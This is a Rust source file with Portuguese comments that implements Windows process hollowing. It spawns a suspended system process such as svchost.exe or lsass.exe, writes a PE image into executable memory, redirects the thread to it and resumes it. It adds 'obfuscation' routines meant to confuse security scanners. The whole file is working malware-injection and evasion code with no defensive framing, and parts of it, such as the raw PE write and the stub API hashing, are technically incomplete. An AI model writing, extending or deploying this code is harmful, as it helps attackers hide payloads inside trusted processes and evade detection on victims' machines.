use winapi::{
    um::{
        memoryapi::{VirtualAllocEx, VirtualFreeEx, WriteProcessMemory},
        processthreadsapi::{
            CreateProcessW, GetThreadContext, ResumeThread, SetThreadContext,
            PROCESS_INFORMATION, STARTUPINFOW
        },
        winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED},
        winnt::{
            CONTEXT, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE
        },
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
    },
    shared::minwindef::FALSE,
};
use std::{ffi::OsStr, os::windows::ffi::OsStrExt, ptr, mem};
use sysinfo::System;
use rand::Rng;
use lazy_static::lazy_static;

// Lista de processos hospedeiros comuns
lazy_static! {
    static ref HOST_PROCESSES: Vec<String> = vec![
        "svchost.exe".to_string(),
        "winlogon.exe".to_string(),
        "lsass.exe".to_string(),
        "services.exe".to_string(),
        "spoolsv.exe".to_string(),
        "taskhostw.exe".to_string(),
        "dwm.exe".to_string(),
    ];
}

// Técnicas de ofuscação
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ObfuscationTechnique {
    None,
    SleepObfuscation,
    MemoryScrambling,
    ApiHashing,
    AllTechniques,
}

// Estrutura segura para thread que implementa Send
pub struct ProcessHollower {
    process_info: Option<PROCESS_INFORMATION>,
    obfuscation: ObfuscationTechnique,
    is_continuous: bool,
}

// Implementar Send manualmente já que PROCESS_INFORMATION contém ponteiros brutos
unsafe impl Send for ProcessHollower {}

impl ProcessHollower {
    pub fn new() -> Self {
        Self {
            process_info: None,
            obfuscation: ObfuscationTechnique::AllTechniques,
            is_continuous: false,
        }
    }

    pub fn set_obfuscation(&mut self, technique: ObfuscationTechnique) {
        self.obfuscation = technique;
    }

    pub fn set_continuous_mode(&mut self, continuous: bool) {
        self.is_continuous = continuous;
    }

    fn apply_obfuscation(&self) {
        let mut rng = rand::thread_rng();
        
        match self.obfuscation {
            ObfuscationTechnique::SleepObfuscation => {
                let sleep_time = rng.gen_range(100..500);
                std::thread::sleep(std::time::Duration::from_millis(sleep_time));
            }
            ObfuscationTechnique::MemoryScrambling => {
                // Aloca e libera memória aleatória para confundir scanners
                let size = rng.gen_range(1024..8192);
                let _dummy = vec![0u8; size];
            }
            ObfuscationTechnique::ApiHashing => {
                // Simulação de API hashing (ofuscação de chamadas)
                self.hash_api_call("CreateProcessW");
            }
            ObfuscationTechnique::AllTechniques => {
                if rng.gen_bool(0.5) {
                    std::thread::sleep(std::time::Duration::from_millis(50));
                }
                self.hash_api_call("CreateProcessW");
            }
            ObfuscationTechnique::None => {}
        }
    }

    fn hash_api_call(&self, api_name: &str) {
        // Simulação de hashing de API para bypass
        let _hash = api_name.bytes().fold(0u32, |acc, b| acc.wrapping_add(b as u32));
    }

    pub fn find_best_host(&self) -> Option<String> {
        let mut sys = System::new_all();
        sys.refresh_all();

        // Retorna o caminho completo do primeiro processo válido encontrado
        HOST_PROCESSES.iter()
            .find(|&process_name| {
                sys.processes()
                    .values()
                    .any(|p| p.name() == process_name.as_str())
            })
            .map(|name| format!("C:\\Windows\\System32\\{}", name))
    }

    pub fn create_suspended_process(&mut self, process_path: &str) -> anyhow::Result<()> {
        self.apply_obfuscation();

        let wide_path: Vec<u16> = OsStr::new(process_path)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let mut si: STARTUPINFOW = unsafe { mem::zeroed() };
        si.cb = mem::size_of::<STARTUPINFOW>() as u32;

        let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };

        let success = unsafe {
            CreateProcessW(
                ptr::null_mut(),
                wide_path.as_ptr() as *mut _,
                ptr::null_mut(),
                ptr::null_mut(),
                FALSE,
                CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                ptr::null_mut(),
                ptr::null_mut(),
                &mut si,
                &mut pi,
            )
        };

        if success == 0 {
            let error = unsafe { GetLastError() };
            return Err(anyhow::anyhow!("Falha ao criar processo suspenso: {}", error));
        }

        self.process_info = Some(pi);
        Ok(())
    }

    pub fn perform_hollowing(&mut self, target_path: &str) -> anyhow::Result<()> {
        let pi = self.process_info.as_ref().ok_or(anyhow::anyhow!("Nenhum processo criado"))?;

        // 1. Obter contexto do thread
        let mut context: CONTEXT = unsafe { mem::zeroed() };
        context.ContextFlags = 0x10007; // CONTEXT_FULL

        if unsafe { GetThreadContext(pi.hThread, &mut context) } == 0 {
            return Err(anyhow::anyhow!("Falha ao obter contexto"));
        }

        // 2. Carregar arquivo PE alvo
        let pe_data = std::fs::read(target_path)?;
        let (new_image_base, entry_point, is_64bit) = self.parse_pe(&pe_data)?;

        // 3. Alocar memória no processo
        let alloc_base = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                new_image_base as *mut _,
                pe_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };

        if alloc_base.is_null() {
            return Err(anyhow::anyhow!("Falha ao alocar memória"));
        }

        // 4. Escrever dados do PE
        let mut bytes_written = 0;
        let write_success = unsafe {
            WriteProcessMemory(
                pi.hProcess,
                alloc_base,
                pe_data.as_ptr() as *mut _,
                pe_data.len(),
                &mut bytes_written,
            )
        };

        if write_success == 0 {
            unsafe { VirtualFreeEx(pi.hProcess, alloc_base, 0, MEM_RELEASE) };
            return Err(anyhow::anyhow!("Falha ao escrever na memória"));
        }

        // 5. Atualizar contexto
        if is_64bit {
            context.Rax = alloc_base as u64 + entry_point as u64;
        } else {
            // Para arquitetura x86, usar campos apropriados
            #[cfg(target_arch = "x86")]
            unsafe {
                *(&mut context as *mut CONTEXT as *mut u32).offset(11) = alloc_base as u32 + entry_point;
            }
        }

        if unsafe { SetThreadContext(pi.hThread, &context) } == 0 {
            unsafe { VirtualFreeEx(pi.hProcess, alloc_base, 0, MEM_RELEASE) };
            return Err(anyhow::anyhow!("Falha ao definir contexto"));
        }

        // 6. Retomar execução
        if unsafe { ResumeThread(pi.hThread) } == u32::MAX {
            unsafe { VirtualFreeEx(pi.hProcess, alloc_base, 0, MEM_RELEASE) };
            return Err(anyhow::anyhow!("Falha ao retomar thread"));
        }

        Ok(())
    }

    fn parse_pe(&self, data: &[u8]) -> anyhow::Result<(u64, u32, bool)> {
        if data.len() < 0x40 {
            return Err(anyhow::anyhow!("Arquivo PE muito pequeno"));
        }

        // Verificar assinatura MZ
        if &data[0..2] != b"MZ" {
            return Err(anyhow::anyhow!("Assinatura MZ não encontrada"));
        }

        // Obter offset do cabeçalho PE
        let pe_offset = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;

        if pe_offset + 0x18 >= data.len() {
            return Err(anyhow::anyhow!("Offset PE inválido"));
        }

        // Verificar assinatura PE
        if &data[pe_offset..pe_offset + 4] != b"PE\0\0" {
            return Err(anyhow::anyhow!("Assinatura PE não encontrada"));
        }

        // Determinar se é 32 ou 64 bits
        let magic = u16::from_le_bytes([data[pe_offset + 0x18], data[pe_offset + 0x19]]);
        let is_64bit = magic == 0x20B;

        let (image_base, entry_point) = if is_64bit {
            // PE64
            let image_base = u64::from_le_bytes([
                data[pe_offset + 0x30], data[pe_offset + 0x31],
                data[pe_offset + 0x32], data[pe_offset + 0x33],
                data[pe_offset + 0x34], data[pe_offset + 0x35],
                data[pe_offset + 0x36], data[pe_offset + 0x37],
            ]);
            
            let entry_point = u32::from_le_bytes([
                data[pe_offset + 0x28], data[pe_offset + 0x29],
                data[pe_offset + 0x2A], data[pe_offset + 0x2B],
            ]);
            
            (image_base, entry_point)
        } else {
            // PE32
            let image_base = u32::from_le_bytes([
                data[pe_offset + 0x34], data[pe_offset + 0x35],
                data[pe_offset + 0x36], data[pe_offset + 0x37],
            ]) as u64;
            
            let entry_point = u32::from_le_bytes([
                data[pe_offset + 0x28], data[pe_offset + 0x29],
                data[pe_offset + 0x2A], data[pe_offset + 0x2B],
            ]);
            
            (image_base, entry_point)
        };

        Ok((image_base, entry_point, is_64bit))
    }

    pub fn cleanup(&mut self) {
        if let Some(pi) = self.process_info.take() {
            unsafe {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
    }
}

impl Drop for ProcessHollower {
    fn drop(&mut self) {
        self.cleanup();
    }
}